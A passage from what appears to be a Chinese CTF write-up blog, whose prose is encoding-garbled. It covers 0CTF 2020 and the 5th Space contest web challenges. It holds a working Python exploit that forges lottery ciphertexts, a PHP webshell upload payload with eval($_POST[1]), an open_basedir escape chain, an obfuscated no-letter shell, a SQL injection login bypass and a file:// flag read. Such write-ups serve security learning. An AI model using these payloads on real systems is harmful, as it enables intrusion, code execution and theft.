<span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://pwnable.org:2333/index.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://pwnable.org:2333/user/register&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">    data = response.content.strip()</span><br><span class="line">    data = json.loads(data)</span><br><span class="line">    uuid = data[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    key = uuid[:<span class="number">2</span>] + uuid[<span class="number">-2</span>:]</span><br><span class="line">    resp = session.post(<span class="string">&quot;http://pwnable.org:2333/user/login&quot;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: user, <span class="string">&#x27;password&#x27;</span>: user&#125;)</span><br><span class="line">    data = json.loads(resp.content.strip())</span><br><span class="line">    api_token = data[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;api_token&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        tmp = <span class="built_in">dict</span>[key]</span><br><span class="line">        tmp.append(api_token)</span><br><span class="line">        <span class="built_in">dict</span>[key] = tmp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = [api_token]</span><br><span class="line">        <span class="built_in">dict</span>[key] = tmp</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">dict</span>[key]) &gt; now_num[<span class="string">&quot;num&quot;</span>]:</span><br><span class="line">        now_num[<span class="string">&quot;num&quot;</span>] = <span class="built_in">len</span>(<span class="built_in">dict</span>[key])</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;now amount: %s,now api_token: %s&quot;</span> % (now_num[<span class="string">&quot;num&quot;</span>], <span class="built_in">dict</span>[key])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">processPools</span>():</span></span><br><span class="line">    num = <span class="number">10</span></span><br><span class="line">    pool = Pool(processes=num)</span><br><span class="line">    jobs = []</span><br><span class="line">    manager = Manager()</span><br><span class="line">    <span class="built_in">dict</span> = manager.<span class="built_in">dict</span>()</span><br><span class="line">    now_num = manager.<span class="built_in">dict</span>()</span><br><span class="line">    now_num[<span class="string">&quot;num&quot;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">        job = pool.apply_async(register, (<span class="built_in">dict</span>, now_num))</span><br><span class="line">        jobs.append(job)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span>(<span class="params">user, coin, enc</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;</span><br><span class="line">        <span class="string">&quot;enc&quot;</span>: enc,</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: user, <span class="string">&quot;coin&quot;</span>: coin&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://pwnable.org:2333&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://pwnable.org:2333/lottery.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://pwnable.org:2333/lottery/charge&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;invalid&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">api_token_list</span>):</span></span><br><span class="line">    account = api_token_list[<span class="number">0</span>]</span><br><span class="line">    other = api_token_list[<span class="number">1</span>:]</span><br><span class="line">    data = requests.get(<span class="string">&quot;http://pwnable.org:2333/user/info&quot;</span>, params=&#123;<span class="string">&#x27;api_token&#x27;</span>: account&#125;).content.strip()</span><br><span class="line">    uuid = json.loads(data)[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    data = requests.post(<span class="string">&#x27;http://pwnable.org:2333/lottery/buy&#x27;</span>, data=&#123;<span class="string">&#x27;api_token&#x27;</span>: account&#125;).content.strip()</span><br><span class="line">    enc = json.loads(data)[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line">    middle = b64decode(enc)[<span class="number">-64</span>:<span class="number">-32</span>]</span><br><span class="line">    data = requests.post(<span class="string">&quot;http://pwnable.org:2333/lottery/info&quot;</span>, data=&#123;<span class="string">&#x27;enc&#x27;</span>: enc&#125;).content.strip()</span><br><span class="line">    coin = json.loads(data)[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;coin&#x27;</span>]</span><br><span class="line">    charge(uuid, coin, enc)</span><br><span class="line">    <span class="keyword">for</span> api_token <span class="keyword">in</span> other:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            data = requests.post(<span class="string">&#x27;http://pwnable.org:2333/lottery/buy&#x27;</span>, data=&#123;<span class="string">&#x27;api_token&#x27;</span>: api_token&#125;).content.strip()</span><br><span class="line">            enc = json.loads(data)[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line">            data = requests.post(<span class="string">&quot;http://pwnable.org:2333/lottery/info&quot;</span>, data=&#123;<span class="string">&#x27;enc&#x27;</span>: enc&#125;).content.strip()</span><br><span class="line">            coin = json.loads(data)[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;coin&#x27;</span>]</span><br><span class="line">            tmp = b64decode(enc)</span><br><span class="line">            new_enc = b64encode(tmp[:<span class="number">-64</span>] + middle + tmp[<span class="number">-32</span>:])</span><br><span class="line">            <span class="keyword">assert</span> <span class="built_in">len</span>(b64decode(new_enc)) == <span class="number">128</span></span><br><span class="line">            charge(uuid, coin, new_enc)</span><br><span class="line">    data = requests.get(<span class="string">&quot;http://pwnable.org:2333/user/info&quot;</span>, params=&#123;<span class="string">&#x27;api_token&#x27;</span>: account&#125;).content.strip()</span><br><span class="line">    <span class="built_in">print</span> data</span><br><span class="line">    data = requests.post(<span class="string">&quot;http://pwnable.org:2333/flag&quot;</span>, data=&#123;<span class="string">&#x27;api_token&#x27;</span>: account&#125;).content.strip()</span><br><span class="line">    <span class="built_in">print</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    api_token_list = [<span class="string">&#x27;s4XmpFIYOMnM3YvSRq5MvNSabOheYocT&#x27;</span>, <span class="string">&#x27;p8wRiFb5r17EUBxC9BcAV2NwKlxY6EXE&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;jaJO0sOcyuU8GedKDTfOTTMsdA0GeXtW&#x27;</span>, <span class="string">&#x27;GBRa6X6ZPM15Hrd15vZzNmwbswMsTcxL&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;V29GALnpgMFSjy5nYcGIm4Q3wWbaRE5L&#x27;</span>, <span class="string">&#x27;GaI4LnuYXhA7oUos4hiTbTvnFs1v9DnP&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;HDfi2mG5n8j8pygZcbSiLyM7nrozjPxo&#x27;</span>]</span><br><span class="line">    exp(api_token_list)</span><br><span class="line">    <span class="comment"># processPools()</span></span><br><span class="line">    <span class="comment"># charge()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿è¡Œ <code>processPools</code>å‡½æ•°çˆ†ç ´è´¦æˆ·ï¼Œå¤§æ¦‚çˆ†åˆ° 7 ä¸ªï¼Œå·®ä¸å¤šäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> âœ˜ âš™ î‚° 2020 0CTF î‚° python lottery.py</span><br><span class="line">now amount: 1,now api_token: [u<span class="string">&#x27;dz9ilcIVnOCUbyUxZtUsDHRKBmqKTWYf&#x27;</span>]</span><br><span class="line">now amount: 2,now api_token: [u<span class="string">&#x27;2KfQgLss4EuZLMP2iTttEWOvxq1pmLUH&#x27;</span>, u<span class="string">&#x27;SDZIRWRUicmv85Hckj2FxCumrisGKmxl&#x27;</span>]</span><br><span class="line">now amount: 3,now api_token: [u<span class="string">&#x27;NAdG5IiRWlmxYm4wzjQqa1q8Xe5161S4&#x27;</span>, u<span class="string">&#x27;sfpKMPQ7tnvNC2WlvppGioIc4SCn6gKy&#x27;</span>, u<span class="string">&#x27;Fgj3zGX8NyFPCqlF3HloEfWdaonW3Mz8&#x27;</span>]</span><br><span class="line">now amount: 4,now api_token: [u<span class="string">&#x27;Z2LezEeeKU9iaU8K0MhNV8R6UBKwYn7p&#x27;</span>, u<span class="string">&#x27;LE7f7JzgFHjefO1S0NAtlI0X1xXEzLRg&#x27;</span>, u<span class="string">&#x27;TZvfPzGPW03PlynxFCCFpDVTli2xcu4O&#x27;</span>, u<span class="string">&#x27;Nipjkdoz3hAne81ihDzM9REMtnplJUkh&#x27;</span>]</span><br><span class="line">now amount: 5,now api_token: [u<span class="string">&#x27;Z2LezEeeKU9iaU8K0MhNV8R6UBKwYn7p&#x27;</span>, u<span class="string">&#x27;LE7f7JzgFHjefO1S0NAtlI0X1xXEzLRg&#x27;</span>, u<span class="string">&#x27;TZvfPzGPW03PlynxFCCFpDVTli2xcu4O&#x27;</span>, u<span class="string">&#x27;Nipjkdoz3hAne81ihDzM9REMtnplJUkh&#x27;</span>, u<span class="string">&#x27;0kH6ATi6o24iBUZHorJ1ArdV23GVJuMr&#x27;</span>]</span><br><span class="line">now amount: 6,now api_token: [u<span class="string">&#x27;s4XmpFIYOMnM3YvSRq5MvNSabOheYocT&#x27;</span>, u<span class="string">&#x27;p8wRiFb5r17EUBxC9BcAV2NwKlxY6EXE&#x27;</span>, u<span class="string">&#x27;jaJO0sOcyuU8GedKDTfOTTMsdA0GeXtW&#x27;</span>, u<span class="string">&#x27;GBRa6X6ZPM15Hrd15vZzNmwbswMsTcxL&#x27;</span>, u<span class="string">&#x27;V29GALnpgMFSjy5nYcGIm4Q3wWbaRE5L&#x27;</span>, u<span class="string">&#x27;GaI4LnuYXhA7oUos4hiTbTvnFs1v9DnP&#x27;</span>]</span><br><span class="line">now amount: 7,now api_token: [u<span class="string">&#x27;s4XmpFIYOMnM3YvSRq5MvNSabOheYocT&#x27;</span>, u<span class="string">&#x27;p8wRiFb5r17EUBxC9BcAV2NwKlxY6EXE&#x27;</span>, u<span class="string">&#x27;jaJO0sOcyuU8GedKDTfOTTMsdA0GeXtW&#x27;</span>, u<span class="string">&#x27;GBRa6X6ZPM15Hrd15vZzNmwbswMsTcxL&#x27;</span>, u<span class="string">&#x27;V29GALnpgMFSjy5nYcGIm4Q3wWbaRE5L&#x27;</span>, u<span class="string">&#x27;GaI4LnuYXhA7oUos4hiTbTvnFs1v9DnP&#x27;</span>, u<span class="string">&#x27;HDfi2mG5n8j8pygZcbSiLyM7nrozjPxo&#x27;</span>]</span><br></pre></td></tr></table></figure><p>æŠŠ api_token å¤åˆ¶ä¸‹æ¥ï¼Œè¿è¡Œ <code>exp</code>å‡½æ•°ï¼Œä¸€ä¸ªè´¦æˆ·å¯ä»¥è½¬ä¸‰æ¬¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> âœ˜ âš™ î‚° 2020 0CTF î‚° python lottery.py</span><br><span class="line">&#123;<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;id&quot;</span>:538474,<span class="string">&quot;uuid&quot;</span>:<span class="string">&quot;8f97310b-6784-41a0-8e1f-714266517dbd&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;&#x27;\&quot;*Lv&quot;</span>,<span class="string">&quot;api_token&quot;</span>:<span class="string">&quot;s4XmpFIYOMnM3YvSRq5MvNSabOheYocT&quot;</span>,<span class="string">&quot;coin&quot;</span>:115,<span class="string">&quot;created_at&quot;</span>:<span class="string">&quot;2020-06-29T08:04:30.000000Z&quot;</span>,<span class="string">&quot;updated_at&quot;</span>:<span class="string">&quot;2020-06-29T09:03:55.000000Z&quot;</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;flag&quot;</span>:<span class="string">&quot;flag&#123;f1d6356a-4288-4a13-a28a-78da73328493&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>PSï¼šè¿™ç§åšæ³•æ˜¯æ¢useridï¼Œä¹Ÿå¯ä»¥æ¢ lottery çš„uuidï¼Œè¿™æ ·åªéœ€è¦çˆ†ç ´uuidå‰ä¸¤ä½çš„useräº†ï¼Œæ›´å¿«ä¹Ÿä¸ç”¨å¤šè¿›ç¨‹äº†ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="cloud-computing"><a href="#cloud-computing" class="headerlink" title="cloud computing"></a>cloud computing</h3><p>æ‰“å¼€é¢˜ç›®ï¼Œçœ‹èµ·æ¥å¯ä»¥å†™ä¸€ä¸ª webshellï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . sha1($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">    $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf($data)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;waf sucks...&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;shell&#x27;</span>:</span><br><span class="line">    initShellEnv($dir);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ waf æœ‰è¿‡æ»¤ï¼Œå¯ä»¥è€ƒè™‘ç”¨æ•°ç»„ç»•è¿‡ï¼Œfile_put_contents ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°ç»„æ—¶ï¼Œä¼šæŠŠæ•°ç»„å†…å®¹æ‹¼èµ·æ¥ï¼Œè¿›è¡Œå†™å…¥ã€‚</p><p>æ‰€ä»¥å¯ä»¥æ„é€ ä»¥ä¸‹ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;pwnable.org:47781&#x2F;?action&#x3D;upload&amp;data[0]&#x3D;%3c&amp;data[1]&#x3D;%3f&amp;data[2]&#x3D;php eval($_POST[1]);</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å†™å…¥äº†ä¸€ä¸ªwebshellï¼Œç„¶åå‘ç°æœ‰ open_basediré™åˆ¶ï¼Œä½¿ç”¨ chdirç»•è¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(-1);mkdir(&#39;sandbox&#x2F;4a3499ebbdf052fa2413cf697e5164184c0d824d&#x2F;gml&#39;);chdir(&#39;sandbox&#x2F;4a3499ebbdf052fa2413cf697e5164184c0d824d&#x2F;gml&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c966545fe043e73d.png" alt="image.png"></p><p> è¯»å–flagï¼Œå‘ç°ä¸€å¤§å †ä¹±ç ï¼Œå¥½åƒæ˜¯ä¸ª imgï¼Œè½¬æ¢æˆ base64è¯»å–ï¼Œæœ¬åœ°æ‹¿ foremost è·‘ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2020 0CTF î‚° foremost 0ctfmisc</span><br><span class="line">foremost: &#x2F;usr&#x2F;local&#x2F;etc&#x2F;foremost.conf: No such file or directory</span><br><span class="line">Processing: 0ctfmisc</span><br><span class="line">|*|</span><br></pre></td></tr></table></figure><p>å‡ºäº†ä¸ªå›¾ç‰‡ï¼Œé‡Œé¢æœ‰flagã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-23081ef4788a5488.png" alt="image.png"></p><h3 id="cloud-computing-v2"><a href="#cloud-computing-v2" class="headerlink" title="cloud computing v2"></a>cloud computing v2</h3><p>å¤ä»‡ç‰ˆï¼Œbanäº†å¾ˆå¤šï¼Œchdirä¹Ÿä¸èƒ½ç”¨äº†ï¼Œç”šè‡³ ini_getéƒ½ä¸èƒ½ç”¨äº†ï¼Œçœ‹æ ·å­ä¸Šä¸ªé¢˜åº”è¯¥ä¹Ÿæ˜¯éé¢„æœŸã€‚</p><p>file_get_contents(â€˜127.0.0.1â€™) ä¸€ä¸‹ï¼Œå‘ç°80ç«¯å£æœ‰ä¸ªåˆ«çš„webæœåŠ¡ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-074b4398d03ef2c7.png" alt="image.png"></p><p>è¿™ä¸ªagentï¼Œæƒ³èµ·æ¥v1çš„æ—¶å€™ï¼Œæ ¹ç›®å½•æœ‰ä¸ª agent æ–‡ä»¶ï¼Œæ‹‰ä¸‹æ¥ï¼Œæ˜¯ä¸ªelfã€‚</p><p>goå†™çš„webé€†å‘ï¼Œè£…äº†ä¸ª IDAGolangHelper æ’ä»¶ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-cfe182c523ad3008.png" alt="image.png"></p><p>é€†ä¸åŠ¨äº†â€¦ æœ‰æ—¶é—´çš„è¯æ‰¾ä¸ªé€†å‘æ‰‹è¡¥ä¸€æ³¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›åˆèµ›wp</title>
      <link href="/2020/06/25/2020-5space/"/>
      <url>/2020/06/25/2020-5space/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="hate-php"><a href="#hate-php" class="headerlink" title="hate-php"></a>hate-php</h3><p>ä¸€èˆ¬çš„æ— å­—æ¯shellï¼Œç›´æ¥ç”¨ï½å–åå°±è¡Œäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.36.74.163&#x2F;?code&#x3D;(~%8C%86%8C%8B%9A%92)(~(%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F))</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="do-you-know"><a href="#do-you-know" class="headerlink" title="do you know"></a>do you know</h3><p>å˜é‡èµ‹å€¼ä¸€ç›´ç»•ä¸è¿‡å»ï¼Œ$paramå’Œ$typeè¿™äº›æ— æ³•èµ‹å€¼ï¼Œæ— æ³•xxeã€‚æµ‹è¯•äº†ä¸€ä¸‹ï¼Œ<code>$_SERVER[&#39;QUERY_STRING&#39;];</code>ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œè€Œåé¢èµ‹å€¼æ˜¯$_GETèµ‹çš„å€¼ï¼Œä¿å­˜çš„æ˜¯è§£ç åçš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´wafæ£€æµ‹çš„æ˜¯urlè§£ç å‰çš„valueï¼Œç›´æ¥å°† file:///var/www/html/flag.php è¿›è¡Œurlç¼–ç ï¼Œå¯ä»¥æ‹¿åˆ°flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.36.64.91&#x2F;?a&#x3D;1&amp;b&#x3D;1&amp;url&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</span><br></pre></td></tr></table></figure><h3 id="ç¾å›¢å¤–å–"><a href="#ç¾å›¢å¤–å–" class="headerlink" title="ç¾å›¢å¤–å–"></a>ç¾å›¢å¤–å–</h3><p>www.zipæºç æ³„æ¼ï¼Œå®¡è®¡æºç ã€‚ç™»é™†å¤„æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ã€‚</p><p><code>password=123456&amp;username=admin&#39; and 0 union select &#39;e10adc3949ba59abbe56e057f20f883e&#39; limit 1 offset 0#</code>å¯ä»¥ç™»é™†ï¼Œä½†æ˜¯sessioné‡Œé¢çš„userä¸æ˜¯adminï¼Œå¾ˆå¤šä¸œè¥¿æ²¡æ³•æã€‚</p><p>å°è¯•æ³¨adminçš„å¯†ç ï¼Œç”¨æ—¶é—´ç›²æ³¨ï¼Œä¸èƒ½ç”¨é€—å·ï¼Œä½¿ç”¨case whenä»¥åŠsubstr from ç»•è¿‡ï¼Œç»“æœé¢˜ç›®é™åˆ¶è¯·æ±‚é€Ÿç‡ï¼Œsleep(10)éƒ½ä¸è¡Œï¼Œè¿˜ban ipâ€¦. åº”è¯¥ä¸æ˜¯ç›²æ³¨ã€‚æ‰¾æ‰¾åº”è¯¥æœ‰å…¶ä»–æ³¨å…¥ç‚¹ï¼Œå®¡è®¡åˆ°daochu.phpï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œè¿˜æœ‰å›æ˜¾ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-2a085ffe2c0defff.png" alt="image.png"></p><p>æœ‰ä¸ªhintï¼Œè¯»ä¸€ä¸‹åˆ—åï¼Œæ˜¯hintsã€‚è¯»ä¸€ä¸‹æ•°æ®ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c90035078ec69185.png" alt="image.png"></p><p>çœ‹è¿™ä¸ªç›®å½•ï¼Œå’Œä¸»é¡µä¸€æ¨¡ä¸€æ ·çš„ç•Œé¢â€¦è¿™åº”è¯¥æ˜¯çœŸç›®å½•ã€‚ä¸¤ä¸ªç›®å½•è‚¯å®šæœ‰ä¸åŒã€‚</p><p>æ–°ç›®å½•å¯ä»¥è®¿é—®libæ–‡ä»¶å¤¹ï¼Œè€ŒåŸæ¥çš„ä¸å¯ä»¥ï¼Œlibé‡Œè‚¯å®šæœ‰ä¸œè¥¿ã€‚åœ¨libæ–‡ä»¶å¤¹ä¸‹å‘ç°webuploaderï¼Œç‰ˆæœ¬æ˜¯0.1.5ï¼Œæœä¸€æ³¢æœ‰æ´ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;9finger.cn&#x2F;2020&#x2F;03&#x2F;06&#x2F;CNVD-2018-26054%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#x2F;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</span><br></pre></td></tr></table></figure><p>é“¾æ¥expæ‰“ä¸Šå»ï¼Œphpè¢«è¿‡æ»¤ï¼Œæ¢ä¸ªå¤§å°å†™ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-322391598b0c65d5.png" alt="image.png"></p><p>æç¤ºè®©æˆ‘è®¿é—®<a href="http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php">http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php</a>ï¼Œå›æ˜¾getfileã€‚è¯•ä¸€ä¸‹file=phpinfo();ä¸è¡Œï¼Œfile=/flagï¼Œè¯»åˆ°flagã€‚</p><p><a href="http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag">http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag</a></p><h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3><p>indexè·¯ç”±å°±ä¸€ä¸ªååºåˆ—åŒ–ï¼Œæ˜¾ç„¶å°±æ˜¯æ‰¾é“¾ã€‚æœåˆ°è¿™ä¸€ç¯‡ï¼š<a href="https://www.anquanke.com/post/id/184541#h3-2ã€‚">https://www.anquanke.com/post/id/184541#h3-2ã€‚</a></p><p>è¿™é‡Œçš„Generatorç±»å¯ä»¥ç”¨ï¼Œä½†æ˜¯å¦ä¸€ä¸ªIlluminateBroadcastingæ²¡æœ‰ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œå…¶ä¸­ä¸€ä¸ªå±æ€§å¯æ§ï¼Œèµ‹å€¼æˆæ„é€ çš„Generatorå¯¹è±¡ï¼ŒåŒæ—¶è¿™ä¸ªç±»ææ„å‡½æ•°éœ€è¦è°ƒç”¨è¿™ä¸ªå±æ€§çš„ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ã€‚è¿™æ 